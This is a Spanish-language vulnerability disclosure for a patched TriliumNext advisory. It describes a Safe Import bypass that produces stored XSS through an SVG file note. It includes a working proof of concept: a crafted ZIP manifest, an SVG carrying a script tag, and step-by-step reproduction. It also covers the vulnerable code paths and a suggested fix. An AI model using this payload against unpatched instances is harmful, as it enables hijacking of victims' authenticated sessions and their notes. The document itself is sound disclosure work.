Safe Import Bypass: Stored XSS via SVG_

Trilium <= 0.104.1HighGHSA publishedFixed in 0.105.0Credit: ZsZsec
TriliumNextStored XSSSafe ImportSVGCWE-79

Estado: esta investigación corresponde al advisory público GHSA-xv62-84hw-fc56. TriliumNext corrigió el problema en la versión 0.105.0. La reproducción se realizó únicamente en una instancia Docker local y con datos sintéticos.

Encontré un bypass de Safe Import en TriliumNext que permitía introducir una nota de tipo file con MIME image/svg+xml y contenido SVG que incluía un elemento <script>. Safe Import estaba habilitado por defecto, pero su sanitización cubría los atributos de la nota y el contenido de notas de texto o libros, no el contenido de archivos.

Después de la importación, Trilium servía el archivo byte por byte mediante los endpoints GET /api/notes/:noteId/open y GET /api/attachments/:attachmentId/open. Como el cliente considera que cualquier MIME que comienza por image puede abrirse en el navegador, image/svg+xml llegaba a window.open() como una navegación de nivel superior dentro del origen autenticado.

El resultado era Stored XSS en el origen de Trilium cuando un usuario importaba un ZIP no confiable y abría la nota SVG. En despliegues web/server, el script se ejecutaba con la sesión de la víctima y podía realizar peticiones autenticadas contra la API de notas.

El bypass de Safe Import

El importador procesa el contenido según el tipo declarado por los metadatos del ZIP. La sanitización de contenido se aplica a notas text y book, mientras que el contenido de una nota file atraviesa el dispatcher sin una etapa equivalente:

function processNoteContent(noteMeta, type, mime, content, noteTitle, filePath) {
  if (type === "text" || type === "book") {
    content = processTextNoteContent(content, noteTitle, filePath, noteMeta);
  }
  if (type === "code" && isMarkdownCodeNote(mime)) { /* ... */ }
  if (type === "mindMap") { /* ... */ }
  if (type === "relationMap") { /* ... */ }
  return content;
}

// type === "file": content returned without sanitization

El par type/mime se obtenía directamente de !!!meta.json, controlado por el archivo importado. Por eso declarar explícitamente type: "file" evitaba el pipeline de imágenes que se usa al importar un archivo individual y que habría permitido aplicar otra lógica de procesamiento.

Safe Import sí deshabilitaba atributos peligrosos y sanitizaba ciertos textos y valores de atributos. El hueco era la ausencia de una llamada equivalente para el contenido binario o textual almacenado en notas de tipo archivo.

Sink de serving

Las rutas de apertura delegaban en el helper común de descarga:

export function downloadData(noteOrAttachment, res, contentDisposition) {
  // ...
  res.setHeader("Content-Type", noteOrAttachment.mime);
  res.send(noteOrAttachment.getContent());
}

Cuando el MIME era image/svg+xml, la respuesta se entregaba como SVG sin sanitizar y sin una política CSP restrictiva. Helmet tampoco aportaba una defensa adicional porque la política CSP global estaba deshabilitada en la aplicación server.

El contraste importante estaba en el pipeline de imágenes. Las rutas de imagen y las rutas de notas compartidas aplicaban ambas defensas:

res.set("Content-Security-Policy", SVG_CONTENT_SECURITY_POLICY);
res.send(sanitizeSvg(svgString));

downloadData() era la excepción: un archivo SVG que llegaba por la ruta de apertura no pasaba por ese patrón ya existente.

Trigger en el cliente

La acción Open de la pestaña File Properties y la acción equivalente del menú contextual de attachments llamaban a openNoteExternally(). En el navegador, el cliente permite abrir MIME de imágenes, audio y vídeo:

function canOpenInBrowser(mime) {
  return mime === "application/pdf"
    || mime.startsWith("image")
    || mime.startsWith("audio")
    || mime.startsWith("video");
}

if (canOpenInBrowser(mime)) {
  window.open(getOpenFileUrl(type, entityId));
}

La comprobación usa startsWith("image"), por lo que también acepta image/svg+xml. En el branch web/server esto convierte el endpoint de descarga en una navegación top-level al mismo origen. El branch Electron seguía un camino diferente, guardando el archivo temporalmente y delegando la apertura al sistema operativo.

Prueba de concepto local

El ZIP de reproducción contiene únicamente dos archivos en su raíz:

poc-svg-file-xss.zip
├── !!!meta.json
└── invoice.svg

Los metadatos nativos declaran el archivo como nota de tipo file con MIME SVG:

{
  "formatVersion": 2,
  "appVersion": "0.104.1",
  "files": [
    {
      "noteId": "svgFileXss001",
      "title": "invoice.svg",
      "type": "file",
      "mime": "image/svg+xml",
      "dataFileName": "invoice.svg",
      "attributes": []
    }
  ]
}

El contenido SVG usado en el laboratorio fue:

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 150">
  <script>alert("Stored XSS via SVG — local lab")</script>
  <rect width="300" height="150" fill="#f5f5f5"/>
  <text x="20" y="80" font-family="sans-serif" font-size="16">
    Invoice #4471 (PoC payload)
  </text>
</svg>

El archivo se empaquetó en un entorno local con:

zip -j poc-svg-file-xss.zip !!!meta.json invoice.svg

Reproducción

  1. Iniciar una instancia Docker limpia de Trilium y completar la configuración inicial.
  2. Elegir Import notes into this note... sobre la nota raíz.
  3. Seleccionar poc-svg-file-xss.zip y mantener activado Safe Import.
  4. Abrir la nota importada invoice.svg y seleccionar la pestaña File Properties.
  5. Presionar Open. El navegador navega a /api/notes/<id>/open y el script se ejecuta en el origen de Trilium.

La alerta de prueba solo verificó la ejecución JavaScript en el origen de la aplicación. No se utilizaron cuentas, datos ni instalaciones de terceros.

Impacto

El script ejecutado en el origen de Trilium podía emitir peticiones autenticadas contra la API usando la sesión de la víctima. Esto permitía leer, crear, modificar o eliminar notas y attachments a los que esa cuenta tuviera acceso, no solamente el objeto que contenía el payload.

En una instancia compartida o sincronizada, el alcance podía extenderse a todo el contenido disponible para la cuenta que importó el archivo. El atacante no necesitaba credenciales propias en la instancia, pero sí necesitaba que la víctima importara y abriera un archivo ZIP no confiable, una interacción compatible con restaurar un backup o recibir una exportación de otra persona.

Con backendScriptingEnabled=true, una configuración opcional de mayor riesgo, el XSS podía combinarse con la funcionalidad de scripting backend y escalar a ejecución remota de código. En la configuración predeterminada, el impacto confirmado era el compromiso completo de la sesión autenticada dentro de los permisos de la víctima.

Corrección sugerida

La defensa más robusta es cerrar el hueco en el sink común, en lugar de proteger únicamente la ruta del importador:

res.setHeader("Content-Type", noteOrAttachment.mime);
if (noteOrAttachment.mime === "image/svg+xml") {
  res.setHeader("Content-Security-Policy", SVG_CONTENT_SECURITY_POLICY);
  res.send(sanitizeSvg(noteOrAttachment.getContent()));
  return;
}
res.send(noteOrAttachment.getContent());

Esta protección debe aplicarse de forma consistente a notas y attachments, independientemente de si el SVG llegó mediante Safe Import, una subida individual o una escritura directa mediante API. También conviene mantener pruebas de regresión que verifiquen tanto la sanitización del contenido como la política CSP en todas las rutas que sirven SVG.
